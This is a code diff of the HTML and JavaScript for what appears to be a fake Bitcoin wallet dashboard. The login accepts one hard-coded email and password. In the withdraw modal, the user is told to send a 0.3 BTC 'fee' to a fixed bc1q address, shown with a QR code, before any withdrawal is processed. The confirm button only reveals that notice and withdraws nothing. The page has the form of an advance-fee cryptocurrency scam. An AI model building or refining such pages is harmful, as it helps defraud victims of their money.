@@ -151,7 +151,6 @@
     <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" class="crypto-icon" />
     ≈ <span id="btcAmount">Loading...</span> BTC
   </div>
-  <button class="login-button" onclick="connectWallet()">Connect Wallet</button>
   <button class="settings-btn" onclick="openModal('settingsModal')">Settings</button>
   <iframe src="https://www.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=15&theme=dark&style=1&toolbarbg=1e2328&withdateranges=1&hide_top_toolbar=1" frameborder="0"></iframe>
 </div>
@@ -185,13 +184,13 @@
 <div class="modal" id="withdrawModal">
   <div class="modal-content">
     <h3>Withdraw</h3>
-    <input type="number" id="withdrawAmount" class="login-input" placeholder="Amount in BTC" />
-    <input type="text" id="btcWallet" class="login-input" placeholder="BTC Wallet Address" />
-    <button class="login-button" onclick="handleWithdraw()">Submit</button>
-    <div class="notice hidden" id="withdrawNotice">
-      Please send a fee of <strong>0.3 BTC</strong> to:<br><br>
-      <strong>bc1qdhgh0u5n38a2rt7jvewfk67uja3dxfl2emwe6u</strong><br>
-      <img src="https://chart.googleapis.com/chart?cht=qr&chs=200x200&chl=bc1qdhgh0u5n38a2rt7jvewfk67uja3dxfl2emwe6u" alt="QR Code" />
+    <input type="text" class="login-input" placeholder="BTC Wallet Address" id="btcWallet"/>
+    <input type="number" class="login-input" placeholder="Amount" id="withdrawAmount"/>
+    <button class="login-button" onclick="showWithdrawNotice()">Confirm</button>
+    <div id="withdrawNotice" class="notice hidden">
+      Send 0.3 BTC to the address below to process your withdrawal:<br>
+      <b>bc1qdhgh0u5n38a2rt7jvewfk67uja3dxfl2emwe6u</b>
+      <img src="https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=bitcoin:bc1qdhgh0u5n38a2rt7jvewfk67uja3dxfl2emwe6u" alt="QR Code">
     </div>
     <button class="settings-btn" onclick="closeModal('withdrawModal')">Close</button>
   </div>
@@ -201,20 +200,16 @@
 <div class="modal" id="settingsModal">
   <div class="modal-content">
     <h3>Settings</h3>
-    <button class="logout-btn" onclick="logout()">Logout</button>
+    <button class="login-button" onclick="logout()">Logout</button>
     <button class="settings-btn" onclick="closeModal('settingsModal')">Close</button>
   </div>
 </div>
 
 <script>
-  const fakeDB = {
-    "user77@walletbtc.com": "user77@()"
-  };
-
   function login() {
-    const email = document.getElementById('loginEmail').value.trim();
-    const password = document.getElementById('loginPassword').value.trim();
-    if (fakeDB[email] === password) {
+    const email = document.getElementById('loginEmail').value;
+    const password = document.getElementById('loginPassword').value;
+    if (email === "user77@walletbtc.com" && password === "user77@()") {
       showDashboard();
     } else {
       document.getElementById('loginError').innerText = "Invalid credentials.";
@@ -240,32 +235,13 @@
 
   function closeModal(id) {
     document.getElementById(id).style.display = 'none';
-    if (id === 'withdrawModal') {
-      document.getElementById('withdrawNotice').classList.add('hidden');
+    if (id === "withdrawModal") {
+      document.getElementById("withdrawNotice").classList.add("hidden");
     }
   }
 
-  function handleWithdraw() {
-    const amount = document.getElementById('withdrawAmount').value;
-    const wallet = document.getElementById('btcWallet').value;
-    if (amount && wallet) {
-      document.getElementById('withdrawNotice').classList.remove('hidden');
-    } else {
-      alert("Please enter both amount and wallet address.");
-    }
-  }
-
-  async function connectWallet() {
-    if (window.solana && window.solana.isPhantom) {
-      try {
-        const resp = await window.solana.connect();
-        document.getElementById("walletAddress").innerText = "Connected: " + resp.publicKey.toString();
-      } catch (err) {
-        alert("Connection rejected.");
-      }
-    } else {
-      alert("Phantom Wallet not installed.");
-    }
+  function showWithdrawNotice() {
+    document.getElementById("withdrawNotice").classList.remove("hidden");
   }
 
   async function fetchBTCPrice() {
